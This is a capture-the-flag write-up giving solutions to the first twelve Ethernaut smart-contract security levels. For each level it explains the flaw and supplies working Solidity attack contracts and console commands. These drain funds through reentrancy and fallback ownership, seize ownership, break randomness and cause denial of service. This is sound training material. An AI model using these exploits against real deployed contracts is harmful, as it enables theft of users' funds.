# Ethernaut Solutions

https://ethernaut.openzeppelin.com/

## 0. Hello Ethernaut

**Goal**: Find the flag.

The flag, "ethernaut0", is stored in the public `password` field. Calling the
`authenticate` function with "ethernaut0" solves the tutorial.

## 1. Fallback

**Goal**: Drain the contract of its funds.

The `receive` function is called as a fallback when eth is send directly to
the contract. In this case, `receive` sets `owner = msg.sender` if the sender
has a non-zero entry in the contributions mapping and sends any amount of eth
directly to the contract.

We can then do the following:

* Send 0.0001 eth via `contribute` function to register a non-zero
  contribution for the sender address (send < 0.001 eth to get past the
  require statement).

```
await contract.contribute({value: toWei("0.0001")})
```

* Trigger the receive function by sending eth directly to the contract address.

```
await sendTransaction({
  'from': player,
  'to': instance,
  'value': 1,
  'gas': 30000,
})
```

* We are now the owner and can call `withdraw` to drain the contract.

```
await contract.withdraw()
```

## 2. Fallout

**Goal**: Claim ownership of the contract.

The constructor is misspelled as "Fal1out" instead of "Fallout". As a result,
the "constructor" is instead interpreted as a callable public function. We
simply call the `Fal1out` function, which sets `owner = msg.sender`.

```
await contract.Fal1out()
```

## 3. Coin Flip

**Goal**: Make 10 correct consecutive guesses for the coin flip result.

There is no native RNG in Solidity, so the `CoinFlip` contract implements a
PRNG using the current block number, `block.number`, as a source of
randomness. We can write our own contract to reveal this value and generate
the correct result before calling the `flip` function.

```
pragma solidity ^0.6.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.3.0/contracts/math/SafeMath.sol";

interface CoinFlip {
  function flip(bool _guess) external returns (bool);
}

contract Attack {
  using SafeMath for uint256;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function predictAndFlip(address _target) public {
    CoinFlip cf = CoinFlip(_target);
    cf.flip(uint256(blockhash(block.number.sub(1))).div(FACTOR) == 1);
  }
}
```

By pre-generating the result, we can simply feed it into the `flip` function
and get the correct answer every time. We repeatedly call the `predictAndFlip`
function in our `Attack` contract until we hit the required number of correct
consecutive guesses.

## 4. Telephone

**Goal**: Claim ownership of the contract.

The `changeOwner` function checks that  `tx.orign != msg.sender`. The value of
`tx.origin` contains the address of the Externally Owned Account (EOA) that
created the initial transation. The value `msg.sender`, on the other hand,
refers to the address of the last instance from where the function was called
(which can be either a contract or an EOA).

If we call `changeOwner` directly, `tx.origin` is the same as `msg.sender`.
However, if we relay our call through a contract, `tx.origin` will be set to
the player's address and `msg.sender` will be set to the address of our custom
contract. Thus, we can bypass the check.

```
pragma solidity ^0.8.0;

interface Telephone {
  function changeOwner(address _owner) external;
}

contract Attack {
  function changeTelephoneOwner(address _target, address _owner) public {
    Telephone t = Telephone(_target);
    t.changeOwner(_owner);
  }
}
```

We can call the `changeTelephoneOwner` function in our `Attack` contract to
change the owner of the `Telephone` contract to the address of the player.

## 5. Token

**Goal**: Acquire additional tokens from the contract.

Exploit integer overflow. Since we start with 20 tokens, we can subtract 21
tokens from our balance, which overflows to the max value of uint256. This
value is >= 0, so we bypass the require statement.

Calling the `transfer` function with a `_value` set to 21 will give us an
amount of tokens equal to the max value of uint256. The `_to` address is
irrelevant, and we can set this to a burner address.

```
await contract.transfer('0x0000000000000000000000000000000000000000', 21)
```

## 6. Delegation

**Goal**: Claim ownership of the contract.

We are given a deployed `Delegation` contract, and we must change the owner
using the `Delegate` contract. The `fallback` function contains the code we
are interested in, which executes when we send a transaction to the contract
without providing any function identifier.

We can construct the transaction as follows:

```
await sendTransaction({
  'from': player,
  'to': instance,
  'value': 0,
  'gas': 50000,
  'data': web3.eth.abi.encodeFunctionSignature("pwn()")
})
```

The `delegatecall` function will call `msg.data`, which contains the encoded
function signature "pwn()". The `pwn` function in the `Delegate` contract sets
`owner` to `msg.sender`. It is important to note that the parent contract
state is mutated, since the delegate function is called in the parent's scope.
Thus, `owner` variable is set in the parent contract, NOT in the delegate.

## 7. Force

**Goal**: Make the contract balance greater than zero.

The given contract is empty, and does not have any fallback functions. We can
force payments to it by using the `selfdestruct` builtin.

From the Solidity documentation:

"Destroy the current contract, sending its funds to the given Address and end
execution. Note that selfdestruct has some peculiarities inherited from the
EVM... the receiving contract’s receive function is not executed."

This allows us to bypass the fallback function check, and force funds into the
contract. We do this by calling `selfdestruct` on our own contract.

```
pragma solidity ^0.8.0;

contract Attack {
  constructor(address payable _target) payable {
    selfdestruct(_target);
  }
}
```

## 8. Vault

**Goal**: Unlock the vault.

We're given a contract with a password stored in a private variable. We can't
query its value directly, but we can read it from storage manually since all
contract data is stored publicly.

We can see that the `password` variable is stored directly after the `locked`
boolean. Thus, we read the storage offset by 1 position after the contract
address, which returns the value of the password.

```
await web3.eth.getStorageAt(instance, 1)
```

`0x412076657279207374726f6e67207365637265742070617373776f7264203a29` is the
value we are looking for (`A very strong secret password :)` when we convert
it into a string). Calling `unlock` with this value completes the level.

```
await contract.unlock('0x412076657279207374726f6e67207365637265742070617373776f7264203a29')
```

## 9. King

**Goal**: Break the contract.

Only the fallback function, `receive`, is exposed. The `receive` function will
attempt to call `king.transfer(msg.value)`.

If we write a contract to make this call and omit inclusion of fallback
functions, the transaction will always revert when attempting to call
`transact` on our contract address (effictively a denial of service for any
transaction that comes after our initial one).

```
pragma solidity ^0.8.0;

contract Attack {
  constructor(address payable _target) payable {
    _target.call{value: msg.value}("");
  }
}
```

Note: We cannot use the `transfer` function here to send the eth since it has
a strict gas limit, which is not enough gas to complete the second call to
the `transfer` function in the fallback function of the `King` contract.

## 10. Re-entrancy

Goal: Drain the contract of funds.

To exploit the reentrancy bug in the contract, we need to write our own custom
contract that does two things: donate to the vulnerable contract and withdraw
from the contract using a fallback function. There is 0.001 ether in the
contract, so we can donate the same amount (to maintain a multiple of 0.001
for when we withdraw).

We can then trigger the fallback function by sending an empty transaction to
our attack contract. This will call the vulnerable withdraw function, which in
turn sends funds to our contract (triggering the fallback to withdraw more
funds). Since the remaining value check is done after the fund transfer, this
will cause a recursive loop of withdrawal calls until the contract is drained
of all funds.

```
pragma solidity ^0.8.0;

interface Reentrance {
  function donate(address _to) external payable;
  function withdraw(uint _amount) external;
}

contract Attack {
  Reentrance target;
  uint public amount = 0.001 ether;

  constructor(address payable _target) payable {
    target = Reentrance(_target);
    target.donate{value: amount}(address(this));
  }

  receive() external payable {
    if (address(target).balance > 0) {
      target.withdraw(amount);
    }
  }
}
```

Note: We would want to add some sort of withdrawal functionality to our attack
contract if we actually wanted to extract the stolen funds afterward.

# 11. Elevator

Goal: Change the floor number and set it to the top floor.

The contract calls a function from the `Building` interface to determine if
a floor is the top floor. We can write our own contract that overrides this
function to behave however we want it to.

In this case, we flip a boolean to alternate between true/false return values
each time the malicious `isLastFloor` function is called. Then, calling `goTo`
from our attack contract allows us to set the floor to any arbitrary number.
Additionally, this floor will always be marked as the top floor.

```
pragma solidity ^0.8.0;

interface Elevator {
  function goTo(uint) external;
}

contract Attack {
  Elevator e;
  bool flip = true;

  constructor(address _target) {
    e = Elevator(_target);
  }

  function forceGoTo(uint _floor) public {
    e.goTo(_floor);
  }

  function isLastFloor(uint _unused) public returns (bool) {
    flip = !flip;
    return flip;
  }
}
```

